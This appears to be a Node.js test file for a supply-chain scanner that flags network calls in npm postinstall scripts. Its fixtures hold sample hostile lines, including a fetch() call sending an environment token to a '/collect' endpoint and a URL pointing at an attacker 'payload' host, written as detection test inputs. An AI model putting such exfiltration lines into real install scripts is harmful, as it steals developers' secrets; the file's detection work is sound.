import { describe, it } from 'node:test';
import * as assert from 'node:assert/strict';
import { analyzeNetworkCalls } from '../../../src/analysis/analyzers/network-calls.js';
import type { AnalysisContext } from '../../../src/analysis/types.js';
import type { Packument } from '../../../src/registry/types.js';

const EMPTY_PACKUMENT: Packument = {
  name: 'test-pkg',
  'dist-tags': { latest: '1.0.0' },
  versions: {},
  time: {},
  maintainers: [],
};

function makeContext(source: string): AnalysisContext {
  return {
    packageName: 'test-pkg',
    version: '1.0.0',
    extractedPath: '/tmp/fake',
    allFiles: [],
    installScripts: [
      {
        lifecycle: 'postinstall',
        command: 'node install.js',
        resolvedFile: '/tmp/fake/package/install.js',
        source,
      },
    ],
    packument: EMPTY_PACKUMENT,
  };
}

describe('analyzeNetworkCalls', () => {
  it('detects require("https")', () => {
    const findings = analyzeNetworkCalls(makeContext(`const https = require('https')`));
    assert.ok(findings.some((f) => f.category === 'install-script-network' && f.level === 'critical'));
  });

  it('detects require("http")', () => {
    const findings = analyzeNetworkCalls(makeContext(`const http = require('http')`));
    assert.ok(findings.some((f) => f.category === 'install-script-network'));
  });

  it('detects fetch() call', () => {
    const findings = analyzeNetworkCalls(
      makeContext(`fetch('https://example.com/collect?t=' + process.env.TOKEN)`)
    );
    assert.ok(findings.some((f) => f.category === 'install-script-network'));
  });

  it('detects require("node-fetch")', () => {
    const findings = analyzeNetworkCalls(makeContext(`const fetch = require('node-fetch')`));
    assert.ok(findings.some((f) => f.category === 'install-script-network'));
  });

  it('detects hardcoded http:// URL string literal', () => {
    const findings = analyzeNetworkCalls(
      makeContext(`const url = 'https://attacker.example.com/payload'`)
    );
    assert.ok(findings.some((f) => f.category === 'install-script-network' && f.level === 'high'));
  });

  it('does not flag normal imports without network modules', () => {
    const findings = analyzeNetworkCalls(
      makeContext(`
        const fs = require('fs');
        const path = require('path');
        const os = require('os');
      `)
    );
    assert.equal(findings.length, 0);
  });

  it('does not flag regular strings that are not URLs', () => {
    const findings = analyzeNetworkCalls(
      makeContext(`const msg = 'install complete'`)
    );
    assert.equal(findings.filter(f => f.category === 'install-script-network').length, 0);
  });
});
